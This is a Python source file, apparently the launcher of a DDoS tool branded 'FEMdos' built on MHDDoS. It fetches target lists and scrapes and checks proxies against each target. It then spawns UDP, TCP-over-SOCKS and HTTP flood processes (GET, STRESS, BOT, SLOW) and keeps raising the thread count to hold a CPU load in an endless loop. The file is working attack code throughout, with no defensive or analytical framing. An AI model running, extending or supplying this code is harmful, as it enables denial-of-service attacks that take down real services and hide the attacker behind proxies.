import argparse
import json
import multiprocessing
import os
import random
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil

from MHDDoS.start import ProxyManager
from PyRoxy import ProxyChecker, ProxyType
from targman import TargetManager, Target

__author__ = [
    "PornPrincess"
]

# FEMdos Theme Activated! 💖✨
# Let's keep it fabulous, darling! 💅💖

# Target Manager for all things FEMdos! 💖✨
_TargetManager = TargetManager()

# Variable to store the latest targets
current_targets = []


TO_KILL = False
# -------------------------------
# TARGET & PROXY UPDATE FUNCTIONS
# -------------------------------
def update_targets(period):
    global current_targets
    current_targets = _TargetManager.get_all_targets()
    print(f"✨ Targets updated: {len(current_targets)} fabulous targets! 💖✨")
    # Schedule the next update after the given period
    threading.Timer(period, update_targets, [period]).start()


def update_proxies(period: int, proxy_timeout: float, targets: list):
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            return  # Proxies are already fab enough for now!

    with open('../proxies_config.json') as f:
        config = json.load(f)

    proxies = list(ProxyManager.DownloadFromConfig(config, 0))
    random.shuffle(proxies)

    checked_proxies = []
    size = len(targets)
    print(f'✨ Checking {len(proxies):,} proxies... Get ready for some action! 💖')

    with ThreadPoolExecutor(size) as executor:
        futures = [
            executor.submit(
                ProxyChecker.checkAll,
                proxies=proxies[i::size],
                timeout=proxy_timeout,
                threads=((100*psutil.cpu_count()) // size),  # Roughly 100*CPU cores distributed per target
                url=target.url
            )
            for i, target in enumerate(targets)
        ]
        for future in as_completed(futures):
            checked_proxies.extend(future.result())

    if not checked_proxies:
        sys.exit("💔 Proxy check failed! Network troubles or target not available. Let's fix that, darling!")

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', "w") as all_wr, \
         open('files/proxies/socks4.txt', "w") as socks4_wr, \
         open('files/proxies/socks5.txt', "w") as socks5_wr:
        for proxy in checked_proxies:
            proxy_str = f"{proxy}\n"
            all_wr.write(proxy_str)
            if proxy.type == ProxyType.SOCKS4:
                socks4_wr.write(proxy_str)
            elif proxy.type == ProxyType.SOCKS5:
                socks5_wr.write(proxy_str)


# --------------------------------------
# HELPER FUNCTIONS FOR THREAD MANAGEMENT
# --------------------------------------
def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets):
    """
    Continuously check overall CPU usage. If it is below the target, spawn additional
    processes (each handling a given number of threads) to bring the usage up. If it exceeds
    the target, randomly kill a process.
    """
    # Initialize CPU counters for all processes
    for proc, _ in processes:
        try:
            psutil.Process(proc.pid).cpu_percent(interval=None)
        except psutil.NoSuchProcess:
            continue

    while True:
        time.sleep(4)  # Check every 5 seconds (1s from interval + 4s sleep)

        # Get overall system CPU usage (blocking for 1 sec)
        cpu_percent = psutil.cpu_percent(interval=1)
        print(f"✨ Overall CPU usage: {cpu_percent}% 💖")

        # Clean up dead processes and calculate total threads
        active_processes = []
        total_threads_running = 0
        child_cpu_usage = 0.0
        for p, thread_count in processes:
            try:
                proc = psutil.Process(p.pid)
                if proc.status() != psutil.STATUS_ZOMBIE:
                    child_cpu_usage += proc.cpu_percent(interval=None)
                    total_threads_running += thread_count
                    active_processes.append((p, thread_count))
            except psutil.NoSuchProcess:
                pass
        processes[:] = active_processes

        if cpu_percent > cpu_limit:
            print(f"💔 CPU usage exceeded {cpu_limit}%.")
            if TO_KILL:
                print("Killing some processes to maintain fabulousness!")
            if processes and TO_KILL:
                proc_to_kill, threads_killed = random.choice(processes)
                
                print(f"✨ Killing process {proc_to_kill.pid} which had {threads_killed} threads 💖✨")
                try:
                    p = psutil.Process(proc_to_kill.pid)
                    p.terminate()
                    p.wait(timeout=1)
                except psutil.NoSuchProcess:
                    pass  # Already gone, fabulous!
                except Exception as e:
                    print(f"Error terminating process {proc_to_kill.pid}: {e}")
                processes.remove((proc_to_kill, threads_killed))

        elif cpu_percent < cpu_limit:
            print("Limit not exceeded.")
            
            # Normalize child CPU usage to be comparable to system-wide usage
            normalized_child_cpu = child_cpu_usage / psutil.cpu_count()
            avg_cpu_per_thread = normalized_child_cpu / total_threads_running if total_threads_running > 0 else 0
            
            cpu_diff = cpu_limit - cpu_percent
            if avg_cpu_per_thread > 0:
                new_threads = int(cpu_diff / avg_cpu_per_thread)
            else:
                new_threads = 1000  # Fallback for initial launch

            # Enforce minimum running threads
            required_min_threads = 1000 - total_threads_running
            if required_min_threads > new_threads:
                new_threads = required_min_threads

            if new_threads > 0:
                # Distribute the new threads evenly among targets.
                threads_per_target = max(1, new_threads // len(targets)) if targets else new_threads
                print(f"✨ Spawning {threads_per_target * len(targets)} new threads (~{threads_per_target} per target) 💖")

                # Spawn processes based on the calculated number of threads
                for target in targets:
                    new_p = None
                    if target.url.lower().startswith('udp://'):
                        params = ['UDP', target.url[6:], str(udp_threads), str(period)]
                        new_p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                        processes.append((new_p, udp_threads))
                    elif target.url.lower().startswith('tcp://'):
                        thread_count_each = max(1, threads_per_target // 2)
                        params_s4 = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
                        p4 = subprocess.Popen([sys.executable, './start.py', *list(map(str, params_s4))])
                        processes.append((p4, thread_count_each))
                        params_s5 = ['TCP', target.url[6:], str(thread_count_each), str(period), '5', 'socks5.txt']
                        p5 = subprocess.Popen([sys.executable, './start.py', *list(map(str, params_s5))])
                        processes.append((p5, thread_count_each))
                    else:
                        method = random.choice(target.methods)
                        params = [method, target.url, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)]
                        new_p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                        processes.append((new_p, threads_per_target))
                    
                    # Initialize CPU measurement for the new process(es)
                    for p_obj, _ in processes[-2 if 'tcp' in target.url.lower() else -1:]:
                         try:
                             psutil.Process(p_obj.pid).cpu_percent(interval=None)
                         except psutil.NoSuchProcess:
                             pass
                         
        else:
            print("CPU usage is fabulous! No changes needed. 💖")


# ---------------------------------------
# STARTING THE DDOS (PROCESS SPAWNING)
# ---------------------------------------
def run_ddos(targets: list, period: int, rpc: int, udp_threads: int, http_methods: list, debug: bool, cpu_limit: float):
    """
    Initially spawn one process per target (or two for TCP targets), then let the CPU
    monitor dynamically add (or remove) processes until the CPU usage reaches the target.
    """
    # Start minimally; additional threads will be spawned dynamically.
    params_list = []
    processes = []  # List of tuples: (process, thread_count)

    for target in targets:
        if target.url.lower().startswith('udp://'):
            print(f"💔 UDP target detected. Ensure VPN is on! Target: {target.url}")
            params = ['UDP', target.url[6:], str(udp_threads), str(period)]
            thread_count = udp_threads
            params_list.append((params, thread_count))
        elif target.url.lower().startswith('tcp://'):
            # For TCP, we launch two processes (one for SOCKS4 and one for SOCKS5)
            thread_count_each = 1
            params = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
            params_list.append((params, thread_count_each))
            params = ['TCP', target.url[6:], str(thread_count_each), str(period), '5', 'socks5.txt']
            params_list.append((params, thread_count_each))
        else:
            method = random.choice(target.methods)
            params = [method, target.url, '0', '1', 'proxies.txt', str(rpc), str(period)]
            thread_count = 1
            params_list.append((params, thread_count))

    for params, thread_count in params_list:
        params = list(map(str, params))
        p = subprocess.Popen([sys.executable, './start.py', *params])
        processes.append((p, thread_count))

    # Continuously monitor and adjust CPU usage by spawning/killing processes.
    monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets)

    # Wait for all processes to finish (rarely reached, since monitor_cpu_usage loops infinitely)
    for p, _ in processes:
        p.wait()


def start(period: int, targets: list, rpc: int, udp_threads: int, http_methods: list, proxy_timeout: float, debug: bool, cpu_limit: float, period_attack: int):
    os.chdir('MHDDoS')  # FEMdos headquarters! 💖
    no_proxies = all(target.url.lower().startswith('udp://') for target in targets)

    while True:
        if not no_proxies:
            update_proxies(period, proxy_timeout, targets)
        run_ddos(targets, period_attack, rpc, udp_threads, http_methods, debug, cpu_limit)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    # The threads argument is no longer used in this version.
    parser.add_argument('-p', '--period', type=int, default=300,
                        help='How often to update the proxies (in seconds) 💖✨')
    parser.add_argument('-pa', '--period-attack', type=int, default=300,
                        help='How long to update the proxies (in seconds) 💖✨')
    parser.add_argument('--proxy-timeout', type=float, default=2, metavar='TIMEOUT',
                        help='How long to wait for a proxy connection (default is 2) 💅✨')
    parser.add_argument('--rpc', type=int, default=50,
                        help='Requests to send per proxy (default is 50) 💖✨')
    parser.add_argument('--udp-threads', type=int, default=1,
                        help='Threads for UDP targets 💅✨')
    parser.add_argument('--debug', action='store_true', default=False,
                        help='Enable debug output from FEMdos (because we need to stay fabulous) 💖✨')
    parser.add_argument('--http-methods', nargs='+', default=['GET', 'STRESS', 'BOT', 'SLOW'],
                        help='List of HTTP(s) attack methods to use. Default: GET, STRESS, BOT, SLOW 💅✨')
    parser.add_argument('--cpu-limit', type=float, default=20.0,
                        help='Target CPU usage limit as a percentage (default is 20%) 💖✨')
    parser.add_argument('--max-cpu-limit', type=float, default=30.0,
                        help='Max CPU usage limit before killing processes (default is 30%) 💖✨')
    return parser


def get_methods_for_target(target: Target) -> list:
    return target.methods


def main():
    args = init_argparse().parse_args()
    
    # Initial target fetch and update.
    update_targets(600)
    threading.Timer(args.period, update_targets, [600]).start()

    while True:
        if current_targets:
            methods = [get_methods_for_target(target) for target in current_targets]
            start(args.period, current_targets, args.rpc, args.udp_threads, methods,
                  args.proxy_timeout, args.debug, args.cpu_limit, args.period_attack)
        else:
            print("💔 No targets available! Please check the target manager.")
            time.sleep(args.period)


if __name__ == "__main__":
    main()
